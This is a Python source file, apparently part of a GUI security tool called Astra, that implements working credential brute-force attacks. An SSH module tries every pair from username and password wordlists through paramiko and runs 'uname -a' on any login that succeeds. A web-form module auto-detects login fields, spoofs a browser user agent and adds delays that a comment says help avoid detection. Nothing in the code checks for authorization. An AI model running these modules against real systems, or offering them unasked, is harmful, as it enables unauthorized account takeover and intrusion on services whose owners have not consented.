"""
Brute force modules for Astra
"""

import threading
import socket
import time
import requests
from bs4 import BeautifulSoup
import paramiko
import logging
from PyQt6.QtCore import QObject, pyqtSignal

# Configure logging for paramiko
logging.getLogger('paramiko').setLevel(logging.WARNING)

class BruteForceBase(QObject):
    """Base class for brute force attacks"""
    
    # Signal for progress update (current, total, percentage)
    progress_update = pyqtSignal(int, int, int)
    
    # Signal for result update (success, username, password, extra_info)
    result_update = pyqtSignal(bool, str, str, str)
    
    # Signal for completion
    attack_completed = pyqtSignal()
    
    # Signal for error
    attack_error = pyqtSignal(str)
    
    def __init__(self):
        super().__init__()
        self._stop_event = threading.Event()
        self._pause_event = threading.Event()
        self._pause_event.set()  # Not paused initially
    
    def stop(self):
        """Stop the brute force attack"""
        self._stop_event.set()
    
    def pause(self):
        """Pause the brute force attack"""
        self._pause_event.clear()
    
    def resume(self):
        """Resume the brute force attack"""
        self._pause_event.set()
    
    def _should_continue(self):
        """Check if attack should continue"""
        # Wait if paused
        while not self._pause_event.is_set() and not self._stop_event.is_set():
            time.sleep(0.1)
        
        # Return False if stopped
        return not self._stop_event.is_set()
    
    def load_wordlist(self, file_path):
        """Load wordlist from file"""
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            self.attack_error.emit(f"Error loading wordlist: {str(e)}")
            return []


class SSHBruteForce(BruteForceBase):
    """SSH brute force attack module"""
    
    def __init__(self):
        super().__init__()
        self.timeout = 3
        self.delay = 0.1  # Delay between attempts
    
    def check_credentials(self, target, port, username, password):
        """Check if SSH credentials are valid"""
        try:
            # Create SSH client
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Connect to SSH server
            client.connect(
                target,
                port=port,
                username=username,
                password=password,
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False
            )
            
            # Get system info
            stdin, stdout, stderr = client.exec_command("uname -a", timeout=self.timeout)
            system_info = stdout.read().decode('utf-8').strip()
            
            # Close connection
            client.close()
            
            return True, system_info
            
        except paramiko.AuthenticationException:
            # Authentication failed
            return False, "Authentication failed"
        except (paramiko.SSHException, socket.error) as e:
            # Connection error
            return False, f"Connection error: {str(e)}"
        except Exception as e:
            # Other errors
            return False, f"Error: {str(e)}"
    
    def attack(self, target, port=22, usernames=None, passwords=None, username_file=None, password_file=None):
        """Perform SSH brute force attack"""
        try:
            # Reset stop event
            self._stop_event.clear()
            self._pause_event.set()
            
            # Load usernames
            if username_file:
                usernames = self.load_wordlist(username_file)
            if not usernames:
                self.attack_error.emit("No usernames provided")
                return
            
            # Load passwords
            if password_file:
                passwords = self.load_wordlist(password_file)
            if not passwords:
                self.attack_error.emit("No passwords provided")
                return
            
            # Calculate total attempts
            total_attempts = len(usernames) * len(passwords)
            current_attempt = 0
            
            # Start brute force
            for username in usernames:
                # Skip empty usernames
                if not username:
                    continue
                
                for password in passwords:
                    # Check if attack should continue
                    if not self._should_continue():
                        return
                    
                    # Skip empty passwords
                    if not password:
                        continue
                    
                    # Attempt login
                    success, info = self.check_credentials(target, port, username, password)
                    
                    # Update current attempt counter
                    current_attempt += 1
                    percentage = int((current_attempt / total_attempts) * 100)
                    
                    # Update progress
                    self.progress_update.emit(current_attempt, total_attempts, percentage)
                    
                    # Emit result if successful
                    if success:
                        self.result_update.emit(True, username, password, info)
                    
                    # Add delay to avoid overloading the server
                    time.sleep(self.delay)
            
            # Complete the attack
            if not self._stop_event.is_set():
                self.attack_completed.emit()
                
        except Exception as e:
            self.attack_error.emit(str(e))


class WebFormBruteForce(BruteForceBase):
    """Web form brute force attack module"""
    
    def __init__(self):
        super().__init__()
        self.timeout = 5
        self.delay = 0.5  # Longer delay for web requests
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        
    def check_login(self, url, data, username_field, password_field, username, password, 
                   success_pattern=None, failure_pattern=None, method="POST"):
        """Attempt to login to a web form"""
        try:
            # Create session
            session = requests.Session()
            session.headers.update({'User-Agent': self.user_agent})
            
            # Clone data and insert credentials
            form_data = data.copy()
            form_data[username_field] = username
            form_data[password_field] = password
            
            # Make request
            if method.upper() == "POST":
                response = session.post(url, data=form_data, timeout=self.timeout)
            else:
                response = session.get(url, params=form_data, timeout=self.timeout)
            
            content = response.text
            
            # Check for success/failure patterns
            if success_pattern and success_pattern in content:
                return True, "Login successful (pattern matched)"
            elif failure_pattern and failure_pattern in content:
                return False, "Login failed (pattern matched)"
            
            # Check response status and URL change
            if response.history and response.url != url:
                return True, f"Possible success (redirected to {response.url})"
            
            # Try to guess based on common success/failure messages
            if any(x in content.lower() for x in ['welcome', 'dashboard', 'logged in', 'profile', 'account']):
                return True, "Possible success (common success terms found)"
            if any(x in content.lower() for x in ['incorrect', 'invalid', 'failed', 'wrong password']):
                return False, "Login failed (common failure terms found)"
                
            # Default to Unknown
            return False, f"Unknown result (status: {response.status_code})"
            
        except requests.exceptions.RequestException as e:
            return False, f"Request error: {str(e)}"
        except Exception as e:
            return False, f"Error: {str(e)}"
    
    def detect_form_fields(self, url):
        """Detect form fields on the login page"""
        try:
            response = requests.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = soup.find_all('form')
            if not forms:
                return None
            
            # Find the first form with password field
            for form in forms:
                password_field = form.find('input', {'type': 'password'})
                if password_field:
                    action = form.get('action', '')
                    method = form.get('method', 'post')
                    
                    # Handle relative URLs
                    if action and not action.startswith('http'):
                        if action.startswith('/'):
                            base_url = '/'.join(url.split('/')[:3])  # http(s)://domain.com
                            action = base_url + action
                        else:
                            action = url.rstrip('/') + '/' + action
                    
                    # If action is empty, use current URL
                    if not action:
                        action = url
                    
                    # Get all input fields
                    fields = {}
                    username_field = None
                    password_field_name = None
                    
                    for input_tag in form.find_all('input'):
                        name = input_tag.get('name')
                        if not name:
                            continue
                            
                        input_type = input_tag.get('type', '')
                        value = input_tag.get('value', '')
                        
                        if input_type == 'password':
                            password_field_name = name
                        elif input_type in ['text', 'email']:
                            username_field = name
                            
                        # Add to fields if not username/password
                        if input_type not in ['password']:
                            fields[name] = value
                    
                    # If username field not found, look for common names
                    if not username_field:
                        for input_tag in form.find_all('input'):
                            name = input_tag.get('name', '').lower()
                            if name in ['username', 'user', 'email', 'login', 'id']:
                                username_field = input_tag.get('name')
                                break
                    
                    return {
                        'action': action,
                        'method': method,
                        'fields': fields,
                        'username_field': username_field,
                        'password_field': password_field_name
                    }
            
            return None
            
        except Exception as e:
            self.attack_error.emit(f"Error detecting form fields: {str(e)}")
            return None
    
    def attack(self, url, usernames=None, passwords=None, username_file=None, password_file=None,
              username_field=None, password_field=None, additional_fields=None, 
              success_pattern=None, failure_pattern=None, method="POST"):
        """Perform web form brute force attack"""
        try:
            # Reset stop event
            self._stop_event.clear()
            self._pause_event.set()
            
            # Try to auto-detect form fields if not provided
            form_data = {}
            if not username_field or not password_field:
                form_info = self.detect_form_fields(url)
                if form_info:
                    url = form_info['action']
                    method = form_info['method']
                    form_data = form_info['fields']
                    username_field = form_info['username_field']
                    password_field = form_info['password_field']
                    
                    self.result_update.emit(
                        False, 
                        "auto-detect", 
                        "auto-detect",
                        f"Form detected: URL={url}, Method={method}, Username field={username_field}, Password field={password_field}"
                    )
            
            # Add additional fields
            if additional_fields:
                form_data.update(additional_fields)
            
            # Check if form fields were detected or provided
            if not username_field or not password_field:
                self.attack_error.emit("Could not determine form fields for login")
                return
            
            # Load usernames
            if username_file:
                usernames = self.load_wordlist(username_file)
            if not usernames:
                self.attack_error.emit("No usernames provided")
                return
            
            # Load passwords
            if password_file:
                passwords = self.load_wordlist(password_file)
            if not passwords:
                self.attack_error.emit("No passwords provided")
                return
            
            # Calculate total attempts
            total_attempts = len(usernames) * len(passwords)
            current_attempt = 0
            
            # Start brute force
            for username in usernames:
                # Skip empty usernames
                if not username:
                    continue
                
                for password in passwords:
                    # Check if attack should continue
                    if not self._should_continue():
                        return
                    
                    # Skip empty passwords
                    if not password:
                        continue
                    
                    # Attempt login
                    success, info = self.check_login(
                        url, form_data, username_field, password_field,
                        username, password, success_pattern, failure_pattern, method
                    )
                    
                    # Update current attempt counter
                    current_attempt += 1
                    percentage = int((current_attempt / total_attempts) * 100)
                    
                    # Update progress
                    self.progress_update.emit(current_attempt, total_attempts, percentage)
                    
                    # Emit result if successful
                    if success:
                        self.result_update.emit(True, username, password, info)
                        
                        # Option to stop on first success
                        # Uncomment to enable
                        # return
                    
                    # Add delay to avoid overloading the server and detection
                    time.sleep(self.delay)
            
            # Complete the attack
            if not self._stop_event.is_set():
                self.attack_completed.emit()
                
        except Exception as e:
            self.attack_error.emit(str(e))
